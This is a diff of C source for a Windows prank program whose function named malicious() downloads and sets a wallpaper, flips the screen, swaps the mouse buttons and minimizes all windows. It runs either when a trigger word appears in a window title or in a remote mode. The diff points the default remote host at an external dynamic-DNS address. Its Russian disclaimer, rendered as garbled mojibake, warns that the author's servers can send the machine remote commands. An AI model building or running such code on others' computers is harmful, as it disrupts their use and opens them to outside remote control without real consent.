@@ -1,22 +1,26 @@
-#include <stdio.h>
+Ôªø#include <stdio.h>
 #include <windows.h>
 #include <shlwapi.h>
 
 #pragma comment(lib, "Urlmon.lib")
 #pragma comment(lib, "Shlwapi.lib")
 
-wchar_t defaultUrl[256] = L"https://klike.net/uploads/posts/2019-05/1556708032_1.jpg";
-wchar_t delim[3] = L" \n";
+wchar_t const defaultUrl[256] = L"https://www.meme-arsenal.com/memes/9b703735887c2cfa6c6e1dad3fe35332.jpg";
+wchar_t const remote[7] = L"remote";
+wchar_t const mine[5] = L"mine";
+wchar_t const delim[3] = L" \n";
+wchar_t const CONFIG_NAME[11] = L"config.txt";
 wchar_t URL[1024] = { 0 };
 wchar_t MODE[128] = { 0 };
 wchar_t HOST[1024] = { 0 };
 wchar_t PORT[1024] = { 0 };
-LPCWSTR TRIGGER[256] = { 0 };
+wchar_t *TRIGGER[256] = { 0 };
 wchar_t OLD_WALLPAPER[256] = { 0 };
-wchar_t TEMP[256] = { 0 };
-wchar_t DEFAULT_HOST[256] = L"127.0.0.1";
-wchar_t DEFAULT_PORT[256] = L"54832";
-LPCWSTR DEFAULT_TRIGGER[256] = { L"notepad" };
+wchar_t const DEFAULT_WALLPAPER[32] = L"\\Web\\Wallpaper\\Windows\\img0.jpg";
+wchar_t TEMP_PATH[256] = { 0 };
+wchar_t const DEFAULT_HOST[256] = L"xyitvoeimami.ddns.net";
+wchar_t const DEFAULT_PORT[6] = L"80";
+wchar_t const *DEFAULT_TRIGGER[256] = { L"—ç–ø–æ—Å" };
 int OLD_WIDTH = 0;
 int OLD_HEIGHT = 0;
 
@@ -91,9 +95,9 @@ int changeWallpaper(LPCWSTR path, LPCWSTR link)
 
     if (errcode != 0 && link != defaultUrl)
     {
-        errcode = setWallpaperURL(defaultUrl);
+		errcode = setWallpaperURL(defaultUrl);
     }
-
+    
     return errcode;
 }
 
@@ -101,14 +105,14 @@ int setWallpaperURL(LPCWSTR url)
 {
     int errcode = -1;
 
-    GetTempPathW(256, TEMP);
+    GetTempPathW(256, TEMP_PATH);
 
-    wcscat_s(TEMP, 256, L"wallpaper.png");
-    wprintf(TEMP);
+    wcscat_s(TEMP_PATH, 256, L"wallpaper.png");
+    wprintf(TEMP_PATH);
 
-    if (downloadFile(TEMP, url) == 0)
+    if (downloadFile(TEMP_PATH, url) == 0)
     {
-        errcode = changeWallpaper(TEMP, url);
+        errcode = changeWallpaper(TEMP_PATH, url);
 
     }
     else if (url != defaultUrl)
@@ -130,32 +134,32 @@ LRESULT minimizeAll()
 int loadConfig()
 {
     int errcode = 0;
-    StrCpyW(URL, defaultUrl);
+	StrCpyW(URL, defaultUrl);
 
-    if (FileExists(L"config.txt"))
+    if (FileExists(CONFIG_NAME))
     {
         FILE* file = 0;
 
-        wchar_t url[1024];
-        wchar_t mode[1024];
+        wchar_t url[1024] = { 0 };
+        wchar_t mode[1024] = { 0 };
 
-        if (_wfopen_s(&file, L"config.txt", L"r,ccs=UNICODE") == 0)
+        if (_wfopen_s(&file, CONFIG_NAME, L"r,ccs=UTF-8") == 0)
         {
             if (fgetws(url, 1024, file) != NULL)
             {
-                StrCpyW(URL, url);
+				StrCpyW(URL, url);
 
                 if (fgetws(mode, 1024, file) != NULL)
                 {
                     LPCWSTR token = NULL;
-                    wchar_t buffer[1024] = { 0 };
+					wchar_t buffer[1024] = { 0 };
 
                     token = wcstok_s(mode, delim, &buffer);
                     int count = 0;
 
-                    if (StrCmpW(token, L"remote") == 0)
+                    if (StrCmpW(token, remote) == 0)
                     {
-                        StrCpyW(MODE, token);
+						StrCpyW(MODE, token);
 
                         while (token != NULL)
                         {
@@ -165,45 +169,45 @@ int loadConfig()
                             {
                                 if (count == 0)
                                 {
-                                    if (token == NULL || StrCmpW(token, L"\n") == 0)
-                                    {
+									if (token == NULL || StrCmpW(token, L"\n") == 0)
+									{
                                         StrCpyW(HOST, DEFAULT_HOST);
                                         StrCpyW(PORT, DEFAULT_PORT);
-                                        errcode = -1;
-                                        return -1;
-                                    }
+										errcode = -1;
+										return -1;
+									}
 
-                                    wcscpy_s(HOST, 1024, token);
+									wcscpy_s(HOST, 1024, token);
                                 }
                                 else if (count == 1)
                                 {
-                                    if (token == NULL || StrCmpW(token, L"\n") == 0)
-                                    {
+									if (token == NULL || StrCmpW(token, L"\n") == 0)
+									{
                                         StrCpyW(PORT, DEFAULT_PORT);
                                         errcode = -1;
-                                        return -1;
-                                    }
+										return -1;
+									}
 
-                                    wcscpy_s(PORT, 1024, token);
+									wcscpy_s(PORT, 1024, token);
                                 }
                             }
                             count++;
                         }
                     }
-                    else if (StrCmpW(token, L"mine") == 0)
+                    else if (StrCmpW(token, mine) == 0)
                     {
-                        StrCpyW(MODE, token);
+						StrCpyW(MODE, token);
 
                         while (token != NULL)
                         {
                             token = wcstok_s(NULL, delim, &buffer);
 
-                            if ((token == NULL || StrCmpW(token, L"\n") == 0) && count < 1)
-                            {
+							if ((token == NULL || StrCmpW(token, L"\n") == 0) && count < 1)
+							{
                                 memcpy(TRIGGER, DEFAULT_TRIGGER, 256);
-                                errcode = -1;
-                                return -1;
-                            }
+								errcode = -1;
+								return -1;
+							}
 
                             if (StrCmpW(token, delim) != 0)
                             {
@@ -240,7 +244,7 @@ BOOL CALLBACK enumWindowCallback(HWND hWnd, LPARAM lParam)
         {
             if (TRIGGER[i] == 0)
                 break;
-
+            
             wchar_t trigger[256] = { 0 };
 
             StrCpy(trigger, TRIGGER[i]);
@@ -250,7 +254,7 @@ BOOL CALLBACK enumWindowCallback(HWND hWnd, LPARAM lParam)
                 return 0;
             }
         }
-
+        
     }
 
     return 1;
@@ -258,14 +262,14 @@ BOOL CALLBACK enumWindowCallback(HWND hWnd, LPARAM lParam)
 
 int malicious()
 {
-    int errcode = 0;
+	int errcode = 0;
 
     SystemParametersInfoW(SPI_GETDESKWALLPAPER, 256, OLD_WALLPAPER, 0);
 
-    if (URL != NULL)
-    {
-        errcode = setWallpaperURL(URL);
-    }
+	if (URL != NULL)
+	{
+		errcode = setWallpaperURL(URL);
+	}
     else
         errcode = setWallpaperURL(defaultUrl);
 
@@ -273,7 +277,7 @@ int malicious()
     errcode = SwapMouseButton(1);
     minimizeAll();
 
-    return errcode;
+	return errcode;
 }
 
 int deleteSelf()
@@ -295,9 +299,9 @@ int revertBack()
     {
         wchar_t windir[256] = { 0 };
 
-        if (GetWindowsDirectoryW(windir, 256) != 0 && windir[0] != 0)
+        if(GetWindowsDirectoryW(windir, 256) != 0 || windir[0] != 0)
         {
-            wcscat_s(windir, 256, L"\\Web\\Wallpaper\\Windows\\img0.jpg");
+            wcscat_s(windir, 256, DEFAULT_WALLPAPER);
             SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, windir, 0);
         }
     }
@@ -305,11 +309,11 @@ int revertBack()
     errcode = flipDisplay(0);
     errcode = SwapMouseButton(0);
 
-    if (TEMP[0] != 0)
+    if (TEMP_PATH[0] != 0)
     {
-        if (FileExists(TEMP))
+        if (FileExists(TEMP_PATH))
         {
-            DeleteFileW(TEMP);
+            DeleteFileW(TEMP_PATH);
         }
     }
 
@@ -320,35 +324,40 @@ int WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, 
 {
     if (MessageBoxW(
         0,
-        L"›Ú‡ ÔÓ„‡ÏÏ‡ ÎËˆÂÌÁËÓ‚‡Ì‡ ÎËˆÂÌÁËÂÈ Unlicense (http://unlicense.org/) Ë ˇ‚ÎˇÂÚÒˇ Ó·˘ÂÒÚ‚ÂÌÌ˚Ï ‰ÓÒÚÓˇÌËÂÏ.\nGitHub: https://github.com/HURROLED/ScreenFlip/\n\n¬ÌËÏ‡ÌËÂ! ›Ú‡ ÔÓ„‡ÏÏ‡ ÏÓÊÂÚ ÔÓ‚Â‰ËÚ¸ ˝ÚÓÈ ›¬Ã! «‡ÔÛÒÍ‡Ú¸ ÚÓÎ¸ÍÓ Ì‡ ÒÓ·ÒÚ‚ÂÌÌÓÈ ›¬Ã! «‡ÔÛÒÍ‡Ú¸ ÚÓÎ¸ÍÓ Ì‡ ÚÂÒÚÓ‚ÓÈ ÒËÒÚÂÏÂ! »ÒÔÓÎ¸ÁÓ‚‡Ú¸ ÚÓÎ¸ÍÓ ‚ Ó·‡ÁÓ‚‡ÚÂÎ¸Ì˚ı, ËÒÒÎÂ‰Ó‚‡ÚÂÎ¸ÒÍËı Ë ‰ÂÏÓÌÒÚ‡ˆËÓÌÌ˚ı ˆÂÎˇı! «‡ÔÂ˘‡ÂÚÒˇ ËÒÔÓÎ¸ÁÓ‚‡ÌËÂ ˝ÚÓÈ ÔÓ„‡ÏÏ˚ Ì‡ ›¬Ã, ÂÒÎË Û ¬‡Ò ÌÂÚ ÔˇÏÓÈ Ò‡ÌÍˆËË Ì‡ Á‡ÔÛÒÍ ˝ÚÓÈ ÔÓ„‡ÏÏ˚ ÓÚ ‚Î‡‰ÂÎ¸ˆ‡ ›¬Ã!\n\nÕ‡ÊËÏ‡ˇ ÍÌÓÔÍÛ \"ƒ‡\" ‚ ˝ÚÓÏ ÓÍÌÂ, ¬˚ ÒÓ„Î‡¯‡ÂÚÂÒ¸ Ò ÚÂÏ, ˜ÚÓ ˝Ú‡ ÔÓ„‡ÏÏ‡ ÏÓÊÂÚ ‚˚ÔÓÎÌˇÚ¸ Î˛·˚Â ‰ÂÈÒÚ‚Ëˇ Ò ˝ÚÓÈ ›¬Ã, ‚ÒÂÈ ËÌÙÓÏ‡ˆËÂÈ, Ì‡ ÌÂÈ ı‡Ìˇ˘ÂÈÒˇ, Ë ‚ÒÂÏË ÛÒÚÓÈÒÚ‚‡ÏË, ÔÓ‰ÍÎ˛˜∏ÌÌ˚ÏË Í ÌÂÈ, ‚ÍÎ˛˜‡ˇ, ÌÓ ÌÂ Ó„‡ÌË˜Ë‚‡ˇÒ¸ ÒÎÂ‰Û˛˘ËÏË ‰ÂÈÒÚ‚ËˇÏË:\n- ËÁÏÂÌÂÌËÂÏ Ì‡ÒÚÓÂÍ ÏÓÌËÚÓ‡ ËÎË ‰Û„Ó„Ó ‰ËÒÔÎÂˇ;\n- Á‡„ÛÁÍÓÈ Ë ÒÓı‡ÌÂÌËÂÏ Ì‡ ÎÓÍ‡Î¸Ì˚ı ‰ËÒÍ‡ı ‰‡ÌÌ˚ı ËÁ ÒÂÚË \"»ÌÚÂÌÂÚ\";\n- ÒÏÂÌÓÈ ÙÓÌ‡ ‡·Ó˜Â„Ó ÒÚÓÎ‡;\n- ËÁÏÂÌÂÌËÂÏ Ì‡ÒÚÓÂÍ ÍÓÏÔ¸˛ÚÂÌÓÈ Ï˚¯Ë;\n- ËÁÏÂÌÂÌËÂÏ ÒÓÒÚÓˇÌËˇ ÓÚÍ˚Ú˚ı ÓÍÓÌ;\n- ˜ÚÂÌËÂÏ Ë Ó·‡·ÓÚÍÓÈ ËÌÙÓÏ‡ˆËË Ò ÎÓÍ‡Î¸Ì˚ı ‰ËÒÍÓ‚ ËÎË ‚ÌÂ¯ÌËı ÌÓÒËÚÂÎÂÈ ËÌÙÓÏ‡ˆËË;\n- ˜ÚÂÌËÂÏ Ë Ó·‡·ÓÚÍÓÈ Ò‚ÓÈÒÚ‚ ÓÚÍ˚Ú˚ı ÓÍÓÌ;\n- ÔÓ‰ÍÎ˛˜ÂÌËÂÏ Í ‚ÌÂ¯ÌËÏ ÒÂ‚Â‡Ï ÔÓ ÒÂÚË \"»ÌÚÂÌÂÚ\".\n\nÕ‡ÊËÏ‡ˇ ÍÌÓÔÍÛ \"ƒ‡\" ‚ ˝ÚÓÏ ÓÍÌÂ, ‚˚ ÒÓ„Î‡¯‡ÂÚÂÒ¸ Ò ÚÂÏ, ˜ÚÓ ˝Ú‡ ÔÓ„‡ÏÏ‡ ÏÓÊÂÚ ÔÓ‰ÍÎ˛˜‡ÚÒˇ Í Û‰‡Î∏ÌÌ˚Ï ÒÂ‚Â‡Ï ‡‚ÚÓ‡ ˝ÚÓÈ ÔÓ„‡ÏÏ˚, ÍÓÚÓ˚Â ‡ÒÔÓÎÓÊÂÌ˚ ‚ œÂÏË, ‡ Ú‡ÍÊÂ Ò ÚÂÏ, ˜ÚÓ ˝Ú‡ ›¬Ã ÏÓÊÂÚ ÔÓÎÛ˜‡Ú¸ Û‰‡Î∏ÌÌ˚Â ÍÓÏ‡Ì‰˚ ÓÚ ÒÂ‚Â‡, Ë Û Í‡Ê‰Ó„Ó ÔÓ‰ÍÎ˛˜Ë‚¯Â„ÓÒˇ Í ˝ÚÓÏÛ ÒÂ‚ÂÛ ·Û‰ÂÚ Û‰‡Î∏ÌÌ˚È ‰ÓÒÚÛÔ Í ¬‡¯ÂÈ ›¬Ã ‚ ÚÓÏ ˜ËÒÎÂ.\n\n¿‚ÚÓ ˝ÚÓÈ ÔÓ„‡ÏÏ˚ ÌÂ ÌÂÒ∏Ú ÓÚ‚ÂÚÒÚ‚ÂÌÌÓÒÚ¸ Á‡ Î˛·ÓÈ ‚Â‰, ÔË˜ËÌ∏ÌÌ˚È ‰‡ÌÌÓÈ ÔÓ„‡ÏÏÓÈ ˝ÚÓÈ ›¬Ã, ‰Û„ËÏ ›¬Ã, ÙËÁË˜ÂÒÍËÏ Ë ˛Ë‰Ë˜ÂÒÍËÏ ÎËˆ‡Ï, ÛÌË˜ÚÓÊÂÌËÂ, ÍÓÔËÓ‚‡ÌËÂ, ÏÓ‰ËÙËÍ‡ˆË˛, ·ÎÓÍËÓ‚‡ÌËÂ ËÎË Î˛·˚Â ‰Û„ËÂ ‰ÂÈÒÚ‚Ëˇ, ÒÓ‚Â¯∏ÌÌ˚Â ˝ÚÓÈ ÔÓ„‡ÏÏÓÈ ‚ ÓÚÌÓ¯ÂÌËË ¬‡¯Ëı ‰‡ÌÌ˚ı.\n\nÕ‡ÊËÏ‡ˇ ÍÌÓÔÍÛ \"ƒ‡\" ‚ ˝ÚÓÏ ÓÍÌÂ, ¬˚ ÒÓ„Î‡¯‡ÂÚÂÒ¸ ÒÓ ‚ÒÂÏË ‚˚¯ÂÔÂÂ˜ËÒÎÂÌÌ˚ÏË ÛÒÎÓ‚ËˇÏË Ë ‰‡∏ÚÂ ¬‡¯Û Ò‡ÌÍˆË˛ Ì‡ ‚ÒÂ ‚˚¯ÂÔÂÂ˜ËÒÎÂÌÌ˚Â Ë, ‚ÓÓ·˘Â, Î˛·˚Â ‰ÂÈÒÚ‚Ëˇ Ò ¬‡¯ÂÈ ›¬Ã, ‚ÓÁÎ‡„‡ÂÚÂ ‚Ò˛ ÓÚ‚ÂÚÒÚ‚ÂÌÌÓÒÚ¸ Á‡ ˝ÚË ‰ÂÈÒÚ‚Ëˇ ËÒÍÎ˛˜ËÚÂÎ¸ÌÓ Ì‡ ÒÂ·ˇ, ÔÓ‰Ú‚ÂÊ‰‡ÂÚÂ, ˜ÚÓ ‚˚ ÔÓÎÌÓÒÚ¸˛ ÓÁÌ‡ÍÓÏËÎËÒ¸ Ò ˝ÚËÏ ÒÓ„Î‡¯ÂÌËÂÏ.\n\nÕ‡ÊÏËÚÂ ÍÌÓÔÍÛ \"ÕÂÚ\", ˜ÚÓ·˚ ÌÂÏÂ‰ÎÂÌÌÓ ÔÂÍ‡ÚËÚ¸ ‡·ÓÚÛ ÔÓ„‡ÏÏ˚.",
-        L"ŒÚÍ‡Á ÓÚ ÓÚ‚ÂÚÒÚ‚ÂÌÌÓÒÚË",
+        L"–≠—Ç–∞ –ø—Ä–æ–≥—Ä–∞–º–º–∞ –ª–∏—Ü–µ–Ω–∑–∏—Ä–æ–≤–∞–Ω–∞ –ª–∏—Ü–µ–Ω–∑–∏–µ–π Unlicense (http://unlicense.org/) –∏ —è–≤–ª—è–µ—Ç—Å—è –æ–±—â–µ—Å—Ç–≤–µ–Ω–Ω—ã–º –¥–æ—Å—Ç–æ—è–Ω–∏–µ–º.\nGitHub: https://github.com/HURROLED/ScreenFlip/\n\n–í–Ω–∏–º–∞–Ω–∏–µ! –≠—Ç–∞ –ø—Ä–æ–≥—Ä–∞–º–º–∞ –º–æ–∂–µ—Ç –ø–æ–≤—Ä–µ–¥–∏—Ç—å —ç—Ç–æ–π –≠–í–ú! –ó–∞–ø—É—Å–∫–∞—Ç—å —Ç–æ–ª—å–∫–æ –Ω–∞ —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–æ–π –≠–í–ú! –ó–∞–ø—É—Å–∫–∞—Ç—å —Ç–æ–ª—å–∫–æ –Ω–∞ —Ç–µ—Å—Ç–æ–≤–æ–π —Å–∏—Å—Ç–µ–º–µ! –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ç–æ–ª—å–∫–æ –≤ –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö, –∏—Å—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏—Ö –∏ –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–æ–Ω–Ω—ã—Ö —Ü–µ–ª—è—Ö! –ó–∞–ø—Ä–µ—â–∞–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —ç—Ç–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã –Ω–∞ –≠–í–ú, –µ—Å–ª–∏ —É –í–∞—Å –Ω–µ—Ç –ø—Ä—è–º–æ–π —Å–∞–Ω–∫—Ü–∏–∏ –Ω–∞ –∑–∞–ø—É—Å–∫ —ç—Ç–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã –æ—Ç –≤–ª–∞–¥–µ–ª—å—Ü–∞ –≠–í–ú!\n\n–ù–∞–∂–∏–º–∞—è –∫–Ω–æ–ø–∫—É \"–î–∞\" –≤ —ç—Ç–æ–º –æ–∫–Ω–µ, –í—ã —Å–æ–≥–ª–∞—à–∞–µ—Ç–µ—Å—å —Å —Ç–µ–º, —á—Ç–æ —ç—Ç–∞ –ø—Ä–æ–≥—Ä–∞–º–º–∞ –º–æ–∂–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å –ª—é–±—ã–µ –¥–µ–π—Å—Ç–≤–∏—è —Å —ç—Ç–æ–π –≠–í–ú, –≤—Å–µ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π, –Ω–∞ –Ω–µ–π —Ö—Ä–∞–Ω—è—â–µ–π—Å—è, –∏ –≤—Å–µ–º–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞–º–∏, –ø–æ–¥–∫–ª—é—á—ë–Ω–Ω—ã–º–∏ –∫ –Ω–µ–π, –≤–∫–ª—é—á–∞—è, –Ω–æ –Ω–µ –æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞—è—Å—å —Å–ª–µ–¥—É—é—â–∏–º–∏ –¥–µ–π—Å—Ç–≤–∏—è–º–∏:\n- –∏–∑–º–µ–Ω–µ–Ω–∏–µ–º –Ω–∞—Å—Ç—Ä–æ–µ–∫ –º–æ–Ω–∏—Ç–æ—Ä–∞ –∏–ª–∏ –¥—Ä—É–≥–æ–≥–æ –¥–∏—Å–ø–ª–µ—è;\n- –∑–∞–≥—Ä—É–∑–∫–æ–π –∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ–º –Ω–∞ –ª–æ–∫–∞–ª—å–Ω—ã—Ö –¥–∏—Å–∫–∞—Ö –¥–∞–Ω–Ω—ã—Ö –∏–∑ —Å–µ—Ç–∏ \"–ò–Ω—Ç–µ—Ä–Ω–µ—Ç\";\n- —Å–º–µ–Ω–æ–π —Ñ–æ–Ω–∞ —Ä–∞–±–æ—á–µ–≥–æ —Å—Ç–æ–ª–∞;\n- –∏–∑–º–µ–Ω–µ–Ω–∏–µ–º –Ω–∞—Å—Ç—Ä–æ–µ–∫ –∫–æ–º–ø—å—é—Ç–µ—Ä–Ω–æ–π –º—ã—à–∏;\n- –∏–∑–º–µ–Ω–µ–Ω–∏–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏—è –æ—Ç–∫—Ä—ã—Ç—ã—Ö –æ–∫–æ–Ω;\n- —á—Ç–µ–Ω–∏–µ–º –∏ –æ–±—Ä–∞–±–æ—Ç–∫–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ —Å –ª–æ–∫–∞–ª—å–Ω—ã—Ö –¥–∏—Å–∫–æ–≤ –∏–ª–∏ –≤–Ω–µ—à–Ω–∏—Ö –Ω–æ—Å–∏—Ç–µ–ª–µ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏;\n- —á—Ç–µ–Ω–∏–µ–º –∏ –æ–±—Ä–∞–±–æ—Ç–∫–æ–π —Å–≤–æ–π—Å—Ç–≤ –æ—Ç–∫—Ä—ã—Ç—ã—Ö –æ–∫–æ–Ω;\n- –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ–º –∫ –≤–Ω–µ—à–Ω–∏–º —Å–µ—Ä–≤–µ—Ä–∞–º –ø–æ —Å–µ—Ç–∏ \"–ò–Ω—Ç–µ—Ä–Ω–µ—Ç\".\n\n–ù–∞–∂–∏–º–∞—è –∫–Ω–æ–ø–∫—É \"–î–∞\" –≤ —ç—Ç–æ–º –æ–∫–Ω–µ, –≤—ã —Å–æ–≥–ª–∞—à–∞–µ—Ç–µ—Å—å —Å —Ç–µ–º, —á—Ç–æ —ç—Ç–∞ –ø—Ä–æ–≥—Ä–∞–º–º–∞ –º–æ–∂–µ—Ç –ø–æ–¥–∫–ª—é—á–∞—Ç—Å—è –∫ —É–¥–∞–ª—ë–Ω–Ω—ã–º —Å–µ—Ä–≤–µ—Ä–∞–º –∞–≤—Ç–æ—Ä–∞ —ç—Ç–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã, –∫–æ—Ç–æ—Ä—ã–µ —Ä–∞—Å–ø–æ–ª–æ–∂–µ–Ω—ã –≤ –ü–µ—Ä–º–∏, –∞ —Ç–∞–∫–∂–µ —Å —Ç–µ–º, —á—Ç–æ —ç—Ç–∞ –≠–í–ú –º–æ–∂–µ—Ç –ø–æ–ª—É—á–∞—Ç—å —É–¥–∞–ª—ë–Ω–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã –æ—Ç —Å–µ—Ä–≤–µ—Ä–∞, –∏ —É –∫–∞–∂–¥–æ–≥–æ –ø–æ–¥–∫–ª—é—á–∏–≤—à–µ–≥–æ—Å—è –∫ —ç—Ç–æ–º—É —Å–µ—Ä–≤–µ—Ä—É –±—É–¥–µ—Ç —É–¥–∞–ª—ë–Ω–Ω—ã–π –¥–æ—Å—Ç—É–ø –∫ –í–∞—à–µ–π –≠–í–ú –≤ —Ç–æ–º —á–∏—Å–ª–µ.\n\n–ê–≤—Ç–æ—Ä —ç—Ç–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã –Ω–µ –Ω–µ—Å—ë—Ç –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç—å –∑–∞ –ª—é–±–æ–π –≤—Ä–µ–¥, –ø—Ä–∏—á–∏–Ω—ë–Ω–Ω—ã–π –¥–∞–Ω–Ω–æ–π –ø—Ä–æ–≥—Ä–∞–º–º–æ–π —ç—Ç–æ–π –≠–í–ú, –¥—Ä—É–≥–∏–º –≠–í–ú, —Ñ–∏–∑–∏—á–µ—Å–∫–∏–º –∏ —é—Ä–∏–¥–∏—á–µ—Å–∫–∏–º –ª–∏—Ü–∞–º, —É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ, –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ, –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—é, –±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–∏–µ –∏–ª–∏ –ª—é–±—ã–µ –¥—Ä—É–≥–∏–µ –¥–µ–π—Å—Ç–≤–∏—è, —Å–æ–≤–µ—Ä—à—ë–Ω–Ω—ã–µ —ç—Ç–æ–π –ø—Ä–æ–≥—Ä–∞–º–º–æ–π –≤ –æ—Ç–Ω–æ—à–µ–Ω–∏–∏ –í–∞—à–∏—Ö –¥–∞–Ω–Ω—ã—Ö.\n\n–ù–∞–∂–∏–º–∞—è –∫–Ω–æ–ø–∫—É \"–î–∞\" –≤ —ç—Ç–æ–º –æ–∫–Ω–µ, –í—ã —Å–æ–≥–ª–∞—à–∞–µ—Ç–µ—Å—å —Å–æ –≤—Å–µ–º–∏ –≤—ã—à–µ–ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–Ω—ã–º–∏ —É—Å–ª–æ–≤–∏—è–º–∏ –∏ –¥–∞—ë—Ç–µ –í–∞—à—É —Å–∞–Ω–∫—Ü–∏—é –Ω–∞ –≤—Å–µ –≤—ã—à–µ–ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–Ω—ã–µ –∏, –≤–æ–æ–±—â–µ, –ª—é–±—ã–µ –¥–µ–π—Å—Ç–≤–∏—è —Å –í–∞—à–µ–π –≠–í–ú, –≤–æ–∑–ª–∞–≥–∞–µ—Ç–µ –≤—Å—é –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç—å –∑–∞ —ç—Ç–∏ –¥–µ–π—Å—Ç–≤–∏—è –∏—Å–∫–ª—é—á–∏—Ç–µ–ª—å–Ω–æ –Ω–∞ —Å–µ–±—è, –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç–µ, —á—Ç–æ –≤—ã –ø–æ–ª–Ω–æ—Å—Ç—å—é –æ–∑–Ω–∞–∫–æ–º–∏–ª–∏—Å—å —Å —ç—Ç–∏–º —Å–æ–≥–ª–∞—à–µ–Ω–∏–µ–º.\n\n–ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É \"–ù–µ—Ç\", —á—Ç–æ–±—ã –Ω–µ–º–µ–¥–ª–µ–Ω–Ω–æ –ø—Ä–µ–∫—Ä–∞—Ç–∏—Ç—å —Ä–∞–±–æ—Ç—É –ø—Ä–æ–≥—Ä–∞–º–º—ã.",
+        L"–û—Ç–∫–∞–∑ –æ—Ç –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç–∏",
         MB_YESNO + MB_ICONWARNING
     ) == IDYES)
     {
         int ret = 0;
 
-        if (loadConfig() != 0)
-            ret = -1;
+		if (loadConfig() != 0)
+			ret = -1;
 
-        if (StrCmpW(MODE, L"remote") == 0 && HOST != 0 && PORT != 0)
+        if (StrCmpW(MODE, remote) == 0 && HOST != 0 && PORT != 0)
         {
-            if (winsock_init() != 0)
-                ret = -1;
+			if (winsock_init() != 0)
+				ret = -1;
         }
-        else if (StrCmpW(MODE, L"mine") == 0 && TRIGGER != 0)
+        else if (StrCmpW(MODE, mine) == 0 && TRIGGER != 0)
         {
             while (1)
             {
-                ret = GetLastError();
+				ret = GetLastError();
                 if (EnumWindows(enumWindowCallback, 0) == 0)
                 {
                     break;
                 }
             }
-        }
 
-        if (malicious() != 0)
-            ret = -1;
+            if (malicious() != 0)
+                ret = -1;
+        }
+        else
+        {
+            if (malicious() != 0)
+                ret = -1;
+        }
 
         ret = GetLastError();
         return ret;
